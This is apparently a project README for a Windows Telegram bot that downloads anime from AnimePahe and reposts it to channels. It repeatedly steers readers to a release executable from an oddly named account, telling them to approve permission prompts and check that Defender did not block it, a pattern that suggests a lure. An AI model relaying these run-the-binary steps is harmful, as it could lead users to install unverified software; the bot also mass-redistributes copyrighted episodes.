# 📺 AnimePahe - Simple Anime Bot Setup

[![Download AnimePahe](https://img.shields.io/badge/Download%20AnimePahe-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Caylaunpredictable245/AnimePahe/releases)

## 🧭 Overview

AnimePahe is a Telegram bot that helps automate anime download, processing, and upload tasks. It is made for users who want a hands-off setup for managing anime files.

It can run on:

- Windows
- Local PC
- VPS
- Cloud services like Render and Koyeb

This README focuses on Windows users who want to download the app and run it with minimal setup.

## ✨ What It Does

AnimePahe can help with:

- Fetching anime from AnimePahe
- Downloading episodes in batches
- Processing files before upload
- Sending content to channels
- Keeping a queue for requests
- Retrying failed downloads
- Cleaning up old files
- Running timed tasks

## 🪟 Windows Requirements

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 4 GB RAM
- 2 GB free disk space or more
- A stable internet connection
- Telegram installed on your device
- A web browser such as Chrome, Edge, or Firefox

For smooth use, keep more free space if you plan to download many episodes.

## 📥 Download

Visit this page to download:

[Download AnimePahe from Releases](https://github.com/Caylaunpredictable245/AnimePahe/releases)

On the releases page, look for the latest version and download the Windows file that matches your setup.

## 🛠️ Install on Windows

1. Open the download page above.
2. Find the latest release.
3. Download the Windows file from the release assets.
4. Save the file in a folder you can find later, such as `Downloads` or `Desktop`.
5. If the file comes in a `.zip` format, right-click it and choose **Extract All**.
6. Open the extracted folder.
7. Look for the main app file and double-click it to run.
8. If Windows asks for permission, choose **Yes**.
9. Keep the app open while it runs.

## 🚀 First Run

When you run AnimePahe for the first time, it may ask for setup details such as:

- Telegram bot token
- Channel ID
- Admin ID
- Request time
- Folder path for downloads

Enter the details carefully. If you are not sure about one field, use the value from your bot or channel setup.

## 🔐 Telegram Setup

AnimePahe works with Telegram channels and bot access.

You may need to:

- Create a Telegram bot with BotFather
- Copy the bot token
- Add the bot to your channel
- Give the bot permission to post messages
- Add your admin ID so you can control the bot

If you already have a Telegram bot, you can reuse it if it fits this app.

## 📁 Main Workflow

AnimePahe follows this flow:

FETCH → DOWNLOAD → PROCESS → UPLOAD → CLEAN

This means it:

1. Finds anime content
2. Downloads the files
3. Prepares them for upload
4. Sends them to the right channel
5. Removes temporary files after use

## ⚙️ Common Commands

Use these commands in Telegram:

- `/cancel` — stop the current task
- `/latest` — show the latest item
- `/airing` — show airing anime
- `/del_timer` — remove a delete timer
- `/addchnl [id] [name]` — add a channel
- `/removechnl [id] [name]` — remove a channel
- `/listchnl` — list saved channels
- `/set_request_time [HH:MM]` — set the request time

Use the exact format shown above when typing commands.

## 📌 Channel Routing

AnimePahe can send different anime to different channels. This helps if you want:

- One channel for one series
- Separate channels for separate groups
- Better control over uploads

To use channel routing, add the channel ID and name, then map the anime as needed.

## 🕒 Scheduled Tasks

AnimePahe can run on a schedule based on IST time.

You can use this for:

- Daily checks
- Fixed upload times
- Regular cleanup
- New episode tracking

Set the request time with the command above if your build supports timed tasks.

## 🧹 File Cleanup

The app can remove files after upload or after a set time. This helps keep your disk from filling up.

If you plan to keep files, check your settings before enabling cleanup.

## 🔁 Retry and Redownload

If a file fails during download or upload, AnimePahe can try again. This helps when:

- Your internet drops
- A file is incomplete
- A source link fails
- The upload stops midway

Retry support can save time when a task fails once.

## 🧱 Folder Setup

Use a simple folder layout like this:

- `AnimePahe`
- `Downloads`
- `Processed`
- `Logs`

Keep the app files in one folder and the downloaded anime in another. This makes it easier to find files later.

## 🧪 If the App Does Not Start

If the app does not open, check these items:

- You downloaded the latest release
- The file was extracted if it came as a zip
- Windows Defender did not block the file
- You have permission to run the app
- Telegram token and IDs are correct

If the window opens and closes fast, try running it again from the extracted folder.

## 🧭 How to Use It

1. Download the latest release.
2. Extract the file if needed.
3. Run the app on Windows.
4. Add your bot token and channel data.
5. Set your request time if needed.
6. Start the bot or app process.
7. Watch Telegram for updates.
8. Check your download folder for files.

## 📷 Expected Behavior

After setup, you should see:

- Download activity in the app or console
- Telegram updates for task progress
- Files saved in your chosen folder
- Uploads sent to the right channel
- Cleanup after the task finishes

## 🧩 Useful Tips

- Keep the app in a fixed folder
- Do not rename files while the app is running
- Use a stable internet connection
- Make sure your Telegram bot has the right permissions
- Use enough free disk space for batch downloads
- Set one clear download folder for easier tracking

## 📦 Release File Choice

On the releases page, choose the newest Windows build if one is listed.

If there are multiple files, pick the one that matches your system:

- `x64` for most modern Windows PCs
- `x86` for older 32-bit systems
- `.zip` if the app is packed in a folder
- `.exe` if the app runs as a direct program

## 🔍 Commands Quick View

- `/cancel`
- `/latest`
- `/airing`
- `/del_timer`
- `/addchnl [id] [name]`
- `/removechnl [id] [name]`
- `/listchnl`
- `/set_request_time [HH:MM]`

## 🗂️ Files and Settings

Keep these items ready before setup:

- Telegram bot token
- Admin ID
- Channel ID
- Channel name
- Download folder path
- Time format for schedule tasks

Store them in a text file if you want to copy and paste them during setup.

## 🔗 Download Again

If you need to return later, use the same release page:

[Visit AnimePahe Releases](https://github.com/Caylaunpredictable245/AnimePahe/releases)

## 🏁 Windows Run Steps

1. Open the release page.
2. Download the latest Windows file.
3. Extract it if needed.
4. Double-click the app file.
5. Allow Windows permission if asked.
6. Enter your setup values.
7. Start the bot.
8. Keep Telegram open to track progress